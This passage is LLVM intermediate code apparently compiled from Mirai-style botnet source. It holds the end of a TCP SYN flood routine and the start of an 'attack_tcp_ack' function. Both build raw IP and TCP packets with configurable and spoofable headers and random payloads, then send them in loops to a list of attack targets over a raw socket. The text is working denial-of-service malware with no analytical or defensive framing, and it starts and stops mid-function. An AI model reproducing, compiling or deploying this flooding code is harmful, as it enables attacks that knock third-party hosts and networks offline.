  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %287, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #9
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #9
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #10
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #10
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #10
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #10
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #10
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #10
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #9
  br label %287

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #9
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #10
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #10
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #10
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #10
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #10
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #10
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %207
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %207
  %storemerge122129.us = phi i32 [ %226, %207 ], [ 0, %.lr.ph.split.us.preheader ]
  %167 = sext i32 %storemerge122129.us to i64
  %168 = getelementptr inbounds i8*, i8** %8, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %169, i64 20
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 2
  %173 = load i8, i8* %172, align 4
  %174 = icmp ult i8 %173, 32
  br i1 %174, label %175, label %182

; <label>:175:                                    ; preds = %.lr.ph.split.us
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = call i32 @ntohl(i32 %177) #10
  %179 = call i32 @htonl(i32 %178) #10
  %180 = getelementptr inbounds i8, i8* %169, i64 16
  %181 = bitcast i8* %180 to i32*
  store i32 %179, i32* %181, align 4
  br label %182

; <label>:182:                                    ; preds = %.lr.ph.split.us, %175
  %183 = getelementptr inbounds i8, i8* %169, i64 12
  %184 = bitcast i8* %183 to i32*
  store i32 0, i32* %184, align 4
  br i1 %113, label %185, label %188

; <label>:185:                                    ; preds = %182
  %186 = getelementptr inbounds i8, i8* %169, i64 4
  %187 = bitcast i8* %186 to i16*
  store i16 0, i16* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %185, %182
  br i1 %115, label %189, label %191

; <label>:189:                                    ; preds = %188
  %190 = bitcast i8* %171 to i16*
  store i16 0, i16* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %189, %188
  br i1 %117, label %192, label %195

; <label>:192:                                    ; preds = %191
  %193 = getelementptr inbounds i8, i8* %169, i64 22
  %194 = bitcast i8* %193 to i16*
  store i16 0, i16* %194, align 2
  br label %195

; <label>:195:                                    ; preds = %192, %191
  br i1 %118, label %196, label %199

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds i8, i8* %169, i64 24
  %198 = bitcast i8* %197 to i32*
  store i32 0, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %195
  br i1 %119, label %200, label %203

; <label>:200:                                    ; preds = %199
  %201 = getelementptr inbounds i8, i8* %169, i64 28
  %202 = bitcast i8* %201 to i32*
  store i32 0, i32* %202, align 4
  br label %203

; <label>:203:                                    ; preds = %200, %199
  br i1 %120, label %207, label %204

; <label>:204:                                    ; preds = %203
  %205 = getelementptr inbounds i8, i8* %169, i64 38
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 2
  br label %207

; <label>:207:                                    ; preds = %204, %203
  %208 = getelementptr inbounds i8, i8* %169, i64 10
  %209 = bitcast i8* %208 to i16*
  store i16 0, i16* %209, align 2
  %210 = bitcast i8* %169 to i16*
  %211 = call zeroext i16 @checksum_generic(i16* %210, i32 20) #9
  store i16 %211, i16* %209, align 2
  %212 = getelementptr inbounds i8, i8* %169, i64 36
  %213 = bitcast i8* %212 to i16*
  store i16 0, i16* %213, align 4
  %214 = call zeroext i16 @htons(i16 zeroext 40) #10
  %215 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %170, i8* nonnull %171, i16 zeroext %214, i32 40) #9
  store i16 %215, i16* %213, align 4
  %216 = getelementptr inbounds i8, i8* %169, i64 22
  %217 = bitcast i8* %216 to i16*
  %218 = load i16, i16* %217, align 2
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0, i32 1
  store i16 %218, i16* %221, align 2
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %220, i32 0
  %223 = bitcast %struct.sockaddr_in* %222 to %struct.sockaddr*
  %224 = call i64 @sendto(i32 %37, i8* nonnull %169, i64 60, i32 16384, %struct.sockaddr* %223, i32 16) #9
  %225 = load i32, i32* %5, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %5, align 4
  %227 = icmp slt i32 %226, %43
  br i1 %227, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %storemerge122129 = phi i32 [ %285, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %storemerge122129 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #10
  %240 = call i32 @htonl(i32 %239) #10
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20) #9
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #10
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40) #9
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = load i32, i32* %5, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %279, i32 0, i32 1
  store i16 %277, i16* %280, align 2
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %279, i32 0
  %282 = bitcast %struct.sockaddr_in* %281 to %struct.sockaddr*
  %283 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %282, i32 16) #9
  %284 = load i32, i32* %5, align 4
  %285 = add nsw i32 %284, 1
  store i32 %285, i32* %5, align 4
  %286 = icmp slt i32 %285, %43
  br i1 %286, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:287:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %280, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #9
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %107, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = or i16 %68, 80
  %70 = icmp eq i8 %28, 0
  %71 = or i16 %68, 2128
  br i1 %50, label %.lr.ph129.split.us.preheader, label %.lr.ph129.split.preheader

.lr.ph129.split.preheader:                        ; preds = %.lr.ph129
  %.134 = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split

.lr.ph129.split.us.preheader:                     ; preds = %.lr.ph129
  %. = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split.us

.lr.ph129.split.us:                               ; preds = %.lr.ph129.split.us.preheader, %.lr.ph129.split.us
  %72 = phi i32 [ %105, %.lr.ph129.split.us ], [ 0, %.lr.ph129.split.us.preheader ]
  %73 = call noalias i8* @calloc(i64 1510, i64 1) #9
  %74 = sext i32 %72 to i64
  %75 = getelementptr inbounds i8*, i8** %8, i64 %74
  store i8* %73, i8** %75, align 8
  %76 = getelementptr inbounds i8, i8* %73, i64 20
  %77 = getelementptr inbounds i8, i8* %73, i64 40
  store i8 69, i8* %73, align 4
  %78 = getelementptr inbounds i8, i8* %73, i64 1
  store i8 %10, i8* %78, align 1
  %79 = call zeroext i16 @htons(i16 zeroext %49) #10
  %80 = getelementptr inbounds i8, i8* %73, i64 2
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext %12) #10
  %83 = getelementptr inbounds i8, i8* %73, i64 4
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 4
  %85 = getelementptr inbounds i8, i8* %73, i64 8
  store i8 %14, i8* %85, align 4
  %86 = getelementptr inbounds i8, i8* %73, i64 9
  store i8 6, i8* %86, align 1
  %87 = getelementptr inbounds i8, i8* %73, i64 12
  %88 = bitcast i8* %87 to i32*
  store i32 %39, i32* %88, align 4
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %74, i32 1
  %90 = load i32, i32* %89, align 4
  %91 = getelementptr inbounds i8, i8* %73, i64 16
  %92 = bitcast i8* %91 to i32*
  store i32 %90, i32* %92, align 4
  %93 = call zeroext i16 @htons(i16 zeroext %18) #10
  %94 = bitcast i8* %76 to i16*
  store i16 %93, i16* %94, align 4
  %95 = call zeroext i16 @htons(i16 zeroext %20) #10
  %96 = getelementptr inbounds i8, i8* %73, i64 22
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %51) #10
  %99 = zext i16 %98 to i32
  %100 = getelementptr inbounds i8, i8* %73, i64 24
  %101 = bitcast i8* %100 to i32*
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds i8, i8* %73, i64 32
  %103 = bitcast i8* %102 to i16*
  store i16 %., i16* %103, align 4
  call void @rand_str(i8* nonnull %77, i32 %35)
  %104 = load i32, i32* %5, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %5, align 4
  %106 = icmp slt i32 %105, %46
  br i1 %106, label %.lr.ph129.split.us, label %.preheader.loopexit

; <label>:107:                                    ; preds = %42
  %108 = call i32 @close(i32 %40) #9
  br label %280

.preheader.loopexit:                              ; preds = %.lr.ph129.split.us
  br label %.preheader

.preheader.loopexit138:                           ; preds = %.lr.ph129.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit138, %.preheader.loopexit, %.preheader127
  %109 = icmp eq i32 %39, -1
  %110 = and i32 %11, 65535
  %111 = icmp eq i32 %110, 65535
  %112 = and i32 %17, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %19, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = icmp eq i32 %21, 65535
  %117 = icmp eq i32 %22, 65535
  %118 = icmp eq i8 %37, 0
  %119 = sext i32 %35 to i64
  %120 = add nsw i64 %119, 20
  %121 = trunc i64 %120 to i16
  %122 = trunc i64 %120 to i32
  %123 = add nsw i64 %119, 40
  br label %.loopexit

.lr.ph129.split:                                  ; preds = %.lr.ph129.split.preheader, %.lr.ph129.split
  %124 = phi i32 [ %160, %.lr.ph129.split ], [ 0, %.lr.ph129.split.preheader ]
  %125 = call noalias i8* @calloc(i64 1510, i64 1) #9
  %126 = sext i32 %124 to i64
  %127 = getelementptr inbounds i8*, i8** %8, i64 %126
  store i8* %125, i8** %127, align 8
  %128 = getelementptr inbounds i8, i8* %125, i64 20
